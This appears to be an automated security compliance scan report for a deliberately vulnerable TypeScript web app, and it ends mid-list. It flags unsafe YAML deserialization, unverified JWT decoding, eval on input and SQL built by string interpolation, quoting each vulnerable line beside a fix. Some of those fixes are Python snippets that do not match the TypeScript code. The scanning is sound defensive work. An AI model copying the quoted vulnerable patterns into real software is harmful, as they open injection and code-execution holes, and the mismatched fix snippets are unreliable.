# SAGF Workspace Scan Results

**Files Found**: 969
**Files Scanned**: 968
**Files Skipped** (>500KB): 1
**Files with Violations**: 70
**Errors**: 0

## 🚨 Files with Mandard Violations

---

## SAGF Compliance Scan: `rsn/rsnUtil.ts`
**Scanned at**: 2026-10-11T16:33:05.330737+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🟠 HIGH | [SAST-M-004](https://verify.example-org.internal/?id=SAST-M-004) | Prevent Insecure Deserialization | 135 |

#### [SAST-M-004](https://verify.example-org.internal/?id=SAST-M-004) — Insecure deserialization detected
```ts
// Line 135
return yaml.load(content) as ChallengeInfo
```
**Suggested fix:**
```ts
# Suggested fix: use safe deserialisation alternatives
import json, yaml
# WRONG:  data = pickle.loads(user_bytes)  — arbitrary code execution
data = json.loads(user_bytes)         # prefer JSON for untrusted input
# WRONG:  config = yaml.load(stream)
config = yaml.safe_load(stream)       # safe_load disables Python object tags
```
> 💡 **Why**: Risk: This is one of the most critical vulnerabilities, often leading directly to Remote Code Execution (RCE). An attacker can craft a malicious object that, when deserialized, executes arbitrary commands on the server.
> 🔧 **Guidance**: A developer must avoid using dangerous functions like `ObjectInputStream.readObject` on untrusted data, or must implement a secure, whitelisting deserialization proxy.
> [Full remediation →](https://verify.example-org.internal/?id=SAST-M-004)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🟠 High | [HDR-M-006](https://verify.example-org.internal/?id=HDR-M-006) | Enforce Content-Type and Charset |
| 🟠 High | [HDR-M-009](https://verify.example-org.internal/?id=HDR-M-009) | Cache-Control for Sensitive Data |
| 🟠 High | [DEP-M-003](https://verify.example-org.internal/?id=DEP-M-003) | Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion) |
| 🔴 Critical | [HDR-M-005](https://verify.example-org.internal/?id=HDR-M-005) | Disable Legacy X-XSS-Protection Filter |
| 🔴 Critical | [HDR-M-014](https://verify.example-org.internal/?id=HDR-M-014) | Content Security Policy CSP |
| 🔴 Critical | [IDOR-M-001](https://verify.example-org.internal/?id=IDOR-M-001) | IDOR Protection |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "SAST-M-004", "severity": "HIGH", "line": 135, "message": "Insecure deserialization detected", "fix_snippet": "# Suggested fix: use safe deserialisation alternatives\nimport json, yaml\n# WRONG:  data = pickle.loads(user_bytes)  \u2014 arbitrary code execution\ndata = json.loads(user_bytes)         # prefer JSON for untrusted input\n# WRONG:  config = yaml.load(stream)\nconfig = yaml.safe_load(stream)       # safe_load disables Python object tags"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `routes/verify.ts`
**Scanned at**: 2026-10-11T16:33:06.031316+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [API-M-007](https://verify.example-org.internal/?id=API-M-007) | jwt.decode() skips signature verification — use jwt.verify() | 119 |

#### [API-M-007](https://verify.example-org.internal/?id=API-M-007) — jwt.decode() skips signature verification — use jwt.verify()
```ts
// Line 119
const decoded = jws.decode(token) ? jwt.decode(token) : null
```
**Suggested fix:**
```ts
// Suggested fix: always verify the JWT signature before trusting claims
// WRONG:  const payload = jwt.decode(token);  // no signature check!
const payload = jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] });
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🟠 High | [HDR-M-009](https://verify.example-org.internal/?id=HDR-M-009) | Cache-Control for Sensitive Data |
| 🟠 High | [INPUT-M-002](https://verify.example-org.internal/?id=INPUT-M-002) | Input Encoding & Output Encoding |
| 🔴 Critical | [HDR-M-005](https://verify.example-org.internal/?id=HDR-M-005) | Disable Legacy X-XSS-Protection Filter |
| 🔴 Critical | [HDR-M-014](https://verify.example-org.internal/?id=HDR-M-014) | Content Security Policy CSP |
| 🟠 High | [CRYPT-M-006](https://verify.example-org.internal/?id=CRYPT-M-006) | Hardware Security Module (HSM) for High-Value Keys |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🔴 Critical | [SECR-M-005](https://verify.example-org.internal/?id=SECR-M-005) | No Secrets in Build Logs |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "API-M-007", "severity": "CRITICAL", "line": 119, "message": "jwt.decode() skips signature verification \u2014 use jwt.verify()", "fix_snippet": "// Suggested fix: always verify the JWT signature before trusting claims\n// WRONG:  const payload = jwt.decode(token);  // no signature check!\nconst payload = jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] });"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `routes/userProfile.ts`
**Scanned at**: 2026-10-11T16:33:04.222401+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🟠 HIGH | [SAST-M-001](https://verify.example-org.internal/?id=SAST-M-001) | No Critical SAST Findings | 65 |

#### [SAST-M-001](https://verify.example-org.internal/?id=SAST-M-001) — Dangerous code execution function detected
```ts
// Line 65
username = eval(code) // eslint-disable-line no-eval
```
**Suggested fix:**
```ts
# Suggested fix: avoid eval/exec; use subprocess with a list (no shell=True)
import subprocess
# WRONG:  subprocess.call('ls ' + user_input, shell=True)
result = subprocess.run(['ls', user_input], capture_output=True, text=True)  # safe
# For dynamic config: use ast.literal_eval() or json.loads() instead of eval()
```
> 💡 **Why**: Risk: This is the primary defense against code-level flaws. It directly blocks the introduction of vulnerabilities like those found in penetration tests (e.g., Insecure File Upload, IDOR logic). It shifts discovery from a late-stage pen test to the d
> 🔧 **Guidance**: A developer must remediate the flagged vulnerability (e.g., use a parameterized query instead of string concatenation) to meet the quality gate standards.
> [Full remediation →](https://verify.example-org.internal/?id=SAST-M-001)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🔴 Critical | [HDR-M-014](https://verify.example-org.internal/?id=HDR-M-014) | Content Security Policy CSP |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🟠 High | [HDR-M-006](https://verify.example-org.internal/?id=HDR-M-006) | Enforce Content-Type and Charset |
| 🟠 High | [HDR-M-009](https://verify.example-org.internal/?id=HDR-M-009) | Cache-Control for Sensitive Data |
| 🔴 Critical | [HDR-M-005](https://verify.example-org.internal/?id=HDR-M-005) | Disable Legacy X-XSS-Protection Filter |
| 🔴 Critical | [HDR-M-007](https://verify.example-org.internal/?id=HDR-M-007) | Enforce Referrer Policy |
| 🔴 Critical | [HDR-M-008](https://verify.example-org.internal/?id=HDR-M-008) | Enforce Permissions Policy |
| 🔴 Critical | [HDR-M-011](https://verify.example-org.internal/?id=HDR-M-011) | Cross-Origin-Resource-Policy (CORP) |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "SAST-M-001", "severity": "HIGH", "line": 65, "message": "Dangerous code execution function detected", "fix_snippet": "# Suggested fix: avoid eval/exec; use subprocess with a list (no shell=True)\nimport subprocess\n# WRONG:  subprocess.call('ls ' + user_input, shell=True)\nresult = subprocess.run(['ls', user_input], capture_output=True, text=True)  # safe\n# For dynamic config: use ast.literal_eval() or json.loads() instead of eval()"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `routes/search.ts`
**Scanned at**: 2026-10-11T16:33:07.702772+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) | SQL query built by string interpolation or concatenation | 23 |

#### [DB-M-001](https://verify.example-org.internal/?id=DB-M-001) — SQL query built by string interpolation or concatenation
```ts
// Line 23
models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`) // vuln-code-snippet vuln-line unionSqlI...
```
**Suggested fix:**
```ts
# Suggested fix: always use parameterised queries
# WRONG (PHP):  $q = "SELECT * FROM users WHERE id = '$id'";
# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id
# Python (psycopg2 / sqlite3):
cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))
# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);
# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])
# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');
#        ps.setInt(1, userId);
```

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🟠 High | [HDR-M-009](https://verify.example-org.internal/?id=HDR-M-009) | Cache-Control for Sensitive Data |
| 🔴 Critical | [INJECT-M-002](https://verify.example-org.internal/?id=INJECT-M-002) | OS Command Injection Prevention |
| 🟠 High | [DEP-M-002](https://verify.example-org.internal/?id=DEP-M-002) | Package Manager Lifecycle Script Hardening |
| 🟠 High | [DEP-M-003](https://verify.example-org.internal/?id=DEP-M-003) | Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion) |
| 🟠 High | [INJECT-M-001](https://verify.example-org.internal/?id=INJECT-M-001) | LDAP Injection Prevention |
| 🔴 Critical | [AUTH-M-001](https://verify.example-org.internal/?id=AUTH-M-001) | Secure Password Hashing |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |

_+ 56 more applicable mandards — [view all 64 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "DB-M-001", "severity": "CRITICAL", "line": 23, "message": "SQL query built by string interpolation or concatenation", "fix_snippet": "# Suggested fix: always use parameterised queries\n# WRONG (PHP):  $q = \"SELECT * FROM users WHERE id = '$id'\";\n# WRONG (Py):   query = 'SELECT * FROM users WHERE id = ' + user_id\n# Python (psycopg2 / sqlite3):\ncursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n# PHP (PDO):  $s = $pdo->prepare('SELECT * FROM users WHERE id = ?'); $s->execute([$id]);\n# Node.js (pg):  pool.query('SELECT * FROM users WHERE id = $1', [userId])\n# Java:  PreparedStatement ps = conn.prepareStatement('SELECT * FROM users WHERE id = ?');\n#        ps.setInt(1, userId);"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": 